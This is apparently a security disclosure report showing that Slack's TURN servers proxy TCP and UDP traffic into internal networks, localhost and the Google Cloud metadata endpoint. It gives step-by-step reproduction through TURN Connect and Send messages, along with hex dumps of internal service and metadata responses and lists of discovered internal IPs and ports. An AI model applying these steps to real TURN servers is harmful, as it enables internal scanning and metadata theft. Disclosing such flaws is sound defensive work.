# TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services

## Description

The TURN servers used by Slack allow TCP connections and UDP packets to be proxied to the internal network. This gives an attacker the ability to scan and interact with internal systems.

The attacker may proxy TCP connections to the internal network by setting the `XOR-PEER-ADDRESS` of the TURN connect message (method `0x000A`, <https://tools.ietf.org/html/rfc6062#section-4.3>) to a private IPv4 address.

UDP packets may be proxied by setting the `XOR-PEER-ADDRESS` to a private IP in the TURN send message indication (method `0x0006`, <https://tools.ietf.org/html/rfc5766#section-10>).

## Impact

By abusing this feature an attacker will be able to read and potentially modify sensitive information in Slack's internal infrastructure. Typically, this security vulnerability has at least the same impact as an SSRF. However it is considered more useful from an attacker's point of view since attacks are not restricted to HTTP.

## How to reproduce

The credentials to interact with the TURN server are acquired from the POST response sent to:
`https://<team>.slack.com/api/screenhero.rooms.create?_x_id=<id>`

The structure of the POST response is:

```json
{
    "room_id":"<room>",
    "hostname":"<hostname>",
    "port":443,
    "turn_ports":[22466],
    "turn_auth":{
        "username":"<username>",
        "password":"<password>"
    },
    "token":"<token>",
    "survey_percent":0.05,
    "ok":true
}
```

The values `turn_auth.username` and `turn_auth.password` were used so that our toolkit interacts with the TURN server.

### TCP proxying

To successfully proxy a TCP message to the internal network, the following steps were done (the target was `slack-calls-orca-bru-kwd4.slack-core.com`):

1. Send an allocate request message
2. Receive an Unauthorized response with NONCE and REALM
3. Send an allocate request with a valid MESSAGE-INTEGRITY by using NONE, REALM, USERNAME and PASSWORD
4. Receive an allocate success response
5. Send a Connect request with `XOR-PEER-ADDRESS` set to an internal IP and port
6. Receive a Connect successful response
7. Create a new data socket and send a ConnectionBind request
8. Receive a ConnectionBind successful response
9. Send and receive data proxied to internal destination


This operation can also be used to find open ports (i.e. perform portscanning over the proxy) by stopping at point 6. During our testing we discovered the following open ports on `127.0.0.1`: 22, 25, 53, 443, 515, 5666, 8500, 8888, 9090 and 9100.

The following are some results when using our toolkit on `slack-calls-orca-bru-kwd4.slack-core.com` to proxy a simple HTTP message:

Message sent:

```
GET / HTTP/1.1
Host: 127.0.0.1

```

Results:

```
127.0.0.1:9100 open
([]uint8) (len=267 cap=288) {
 00000000  48 54 54 50 2f 31 2e 31  20 32 30 30 20 4f 4b 0d  |HTTP/1.1 200 OK.|
 00000010  0a 44 61 74 65 3a 20 57  65 64 2c 20 32 38 20 4d  |.Date: Wed, 28 M|
 00000020  61 72 20 32 30 31 38 20  32 31 3a 30 34 3a 32 37  |ar 2018 21:04:27|
 00000030  20 47 4d 54 0d 0a 43 6f  6e 74 65 6e 74 2d 4c 65  | GMT..Content-Le|
 00000040  6e 67 74 68 3a 20 31 35  30 0d 0a 43 6f 6e 74 65  |ngth: 150..Conte|
 00000050  6e 74 2d 54 79 70 65 3a  20 74 65 78 74 2f 68 74  |nt-Type: text/ht|
 00000060  6d 6c 3b 20 63 68 61 72  73 65 74 3d 75 74 66 2d  |ml; charset=utf-|
 00000070  38 0d 0a 0d 0a 3c 68 74  6d 6c 3e 0a 09 09 09 3c  |8....<html>....<|
 00000080  68 65 61 64 3e 3c 74 69  74 6c 65 3e 4e 6f 64 65  |head><title>Node|
 00000090  20 45 78 70 6f 72 74 65  72 3c 2f 74 69 74 6c 65  | Exporter</title|
 000000a0  3e 3c 2f 68 65 61 64 3e  0a 09 09 09 3c 62 6f 64  |></head>....<bod|
 000000b0  79 3e 0a 09 09 09 3c 68  31 3e 4e 6f 64 65 20 45  |y>....<h1>Node E|
 000000c0  78 70 6f 72 74 65 72 3c  2f 68 31 3e 0a 09 09 09  |xporter</h1>....|
 000000d0  3c 70 3e 3c 61 20 68 72  65 66 3d 22 2f 6d 65 74  |<p><a href="/met|
 000000e0  72 69 63 73 22 3e 4d 65  74 72 69 63 73 3c 2f 61  |rics">Metrics</a|
 000000f0  3e 3c 2f 70 3e 0a 09 09  09 3c 2f 62 6f 64 79 3e  |></p>....</body>|
 00000100  0a 09 09 09 3c 2f 68 74  6d 6c 3e                 |....</html>|
}
```


```
127.0.0.1:9090 open
([]uint8) (len=1170 cap=1280) {
 00000000  48 54 54 50 2f 31 2e 31  20 32 30 30 20 4f 4b 0d  |HTTP/1.1 200 OK.|
 00000010  0a 43 6f 6e 74 65 6e 74  2d 54 79 70 65 3a 20 74  |.Content-Type: t|
 00000020  65 78 74 2f 68 74 6d 6c  0d 0a 43 6f 6e 74 65 6e  |ext/html..Conten|
 00000030  74 2d 4c 65 6e 67 74 68  3a 20 31 31 30 34 0d 0a  |t-Length: 1104..|
 00000040  0d 0a 3c 3f 78 6d 6c 20  76 65 72 73 69 6f 6e 3d  |..<?xml version=|
 00000050  22 31 2e 30 22 20 65 6e  63 6f 64 69 6e 67 3d 22  |"1.0" encoding="|
 00000060  55 54 46 2d 38 22 3f 3e  0a 3c 21 44 4f 43 54 59  |UTF-8"?>.<!DOCTY|
 00000070  50 45 20 68 74 6d 6c 20  50 55 42 4c 49 43 20 22  |PE html PUBLIC "|
 00000080  2d 2f 2f 57 33 43 2f 2f  44 54 44 20 58 48 54 4d  |-//W3C//DTD XHTM|
 00000090  4c 20 31 2e 30 20 53 74  72 69 63 74 2f 2f 45 4e  |L 1.0 Strict//EN|
 000000a0  22 0a 20 20 20 20 22 68  74 74 70 3a 2f 2f 77 77  |".    "http://ww|
 000000b0  77 2e 77 33 2e 6f 72 67  2f 54 52 2f 78 68 74 6d  |w.w3.org/TR/xhtm|
 000000c0  6c 31 2f 44 54 44 2f 78  68 74 6d 6c 31 2d 73 74  |l1/DTD/xhtml1-st|
 000000d0  72 69 63 74 2e 64 74 64  22 3e 0a 3c 68 74 6d 6c  |rict.dtd">.<html|
 000000e0  20 78 6d 6c 6e 73 3d 22  68 74 74 70 3a 2f 2f 77  | xmlns="http://w|
 000000f0  77 77 2e 77 33 2e 6f 72  67 2f 31 39 39 39 2f 78  |ww.w3.org/1999/x|
 00000100  68 74 6d 6c 22 3e 0a 20  20 3c 68 65 61 64 3e 0a  |html">.  <head>.|
 ....
}
```

More results can be found in `turn_tcp_proxy_response.pcapng`.

The Google Compute instance metadata could also be read by proxying HTTP messages
to `169.254.169.254`:

```
169.254.169.254:80 open


([]uint8) (len=1408 cap=1408) {
 00000000  48 54 54 50 2f 31 2e 31  20 32 30 30 20 4f 4b 0d  |HTTP/1.1 200 OK.|
 00000010  0a 4d 65 74 61 64 61 74  61 2d 46 6c 61 76 6f 72  |.Metadata-Flavor|
 00000020  3a 20 47 6f 6f 67 6c 65  0d 0a 43 6f 6e 74 65 6e  |: Google..Conten|
 00000030  74 2d 54 79 70 65 3a 20  61 70 70 6c 69 63 61 74  |t-Type: applicat|
 00000040  69 6f 6e 2f 74 65 78 74  0d 0a 44 61 74 65 3a 20  |ion/text..Date: |
 00000050  57 65 64 2c 20 32 38 20  4d 61 72 20 32 30 31 38  |Wed, 28 Mar 2018|
 00000060  20 32 31 3a 35 30 3a 31  38 20 47 4d 54 0d 0a 53  | 21:50:18 GMT..S|
 00000070  65 72 76 65 72 3a 20 4d  65 74 61 64 61 74 61 20  |erver: Metadata |
 00000080  53 65 72 76 65 72 20 66  6f 72 20 56 4d 0d 0a 43  |Server for VM..C|
 00000090  6f 6e 74 65 6e 74 2d 4c  65 6e 67 74 68 3a 20 31  |ontent-Length: 1|
 000000a0  37 31 37 39 0d 0a 58 2d  58 53 53 2d 50 72 6f 74  |7179..X-XSS-Prot|
 000000b0  65 63 74 69 6f 6e 3a 20  31 3b 20 6d 6f 64 65 3d  |ection: 1; mode=|
 000000c0  62 6c 6f 63 6b 0d 0a 58  2d 46 72 61 6d 65 2d 4f  |block..X-Frame-O|
 000000d0  70 74 69 6f 6e 73 3a 20  53 41 4d 45 4f 52 49 47  |ptions: SAMEORIG|
 000000e0  49 4e 0d 0a 0d 0a 30 2e  31 2f 6d 65 74 61 2d 64  |IN....0.1/meta-d|
 000000f0  61 74 61 2f 61 74 74 61  63 68 65 64 2d 64 69 73  |ata/attached-dis|
 00000100  6b 73 2f 64 69 73 6b 73  2f 30 2f 64 65 76 69 63  |ks/disks/0/devic|
 00000110  65 4e 61 6d 65 20 70 65  72 73 69 73 74 65 6e 74  |eName persistent|
 00000120  2d 64 69 73 6b 2d 30 0a  30 2e 31 2f 6d 65 74 61  |-disk-0.0.1/meta|
 00000130  2d 64 61 74 61 2f 61 74  74 61 63 68 65 64 2d 64  |-data/attached-d|
 00000140  69 73 6b 73 2f 64 69 73  6b 73 2f 30 2f 69 6e 64  |isks/disks/0/ind|
....
```

From this report we gathered the internal IP 10.33.0.91. A further scan for
ports 8500 and 9090 provided the following open ports:

```
10.33.0.3:8500
10.33.0.5:9090
10.33.0.6:9090
```


### UDP proxying

To successfully proxy a UDP message to the internal network, the following steps were done (the target was `slack-calls-orca-bru-kwd4.slack-core.com`):


1. Send an allocate request message
2. Receive an Unauthorized response with NONCE and REALM
3. Send an allocate request with a valid MESSAGE-INTEGRITY by using NONE, REALM, USERNAME and PASSWORD
4. Receive an allocate success response
5. Send a CreatePermission request with `XOR-PEER-ADDRESS` set to an internal IP and port
6. Send a Send Indication (having `XOR-PEER-ADDRESS` set to internal IP and port) a payload (such as HTTP get)
7. Read Data Indication with response from internal server

UDP proxying is more difficult to test than TCP. We tested using a DNS query payload and got a response from `127.0.0.1`. The result is available in pcap `turn_udp(53)_proxy_response.pcapng`

## Solution

Adequate TURN server ACLs should be put in place to disallow traffic from the TURN server to the internal network or special IP addresses. It is recommended to block access to reserved IP addresses especially those defined in RFC6890.

